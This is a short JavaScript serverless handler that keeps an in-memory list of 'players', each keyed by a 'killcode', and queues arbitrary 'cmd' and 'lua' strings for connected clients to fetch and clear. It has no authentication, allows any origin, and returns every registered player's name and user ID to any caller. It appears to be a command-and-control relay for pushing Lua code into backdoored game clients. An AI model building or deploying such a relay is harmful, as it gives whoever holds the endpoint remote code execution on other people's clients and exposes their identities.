let players = [];

export default function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");

  if (req.method === "GET") {
    const { player, userid, killcode, timestamp, cmd, lua, consume } = req.query;

    // Find or create player entry
    let entry = players.find(p => p.killcode === killcode);
    if (!entry) {
      entry = { player, userid, killcode, timestamp: timestamp || Date.now(), commands: [] };
      players.push(entry);
    } else {
      entry.player = player;
      entry.userid = userid;
      entry.timestamp = timestamp || Date.now();
    }

    // Add new command if provided
    if (cmd) entry.commands.push({ type: "cmd", value: cmd });
    if (lua) entry.commands.push({ type: "lua", value: lua });

    // Return commands and clear if consume=1
    if (consume === "1") {
      const cmds = [...entry.commands];
      entry.commands = [];
      return res.status(200).json(cmds);
    }

    // Otherwise return full player list
    return res.status(200).json(players);
  }

  res.status(405).json({ error: "Method not allowed" });
}
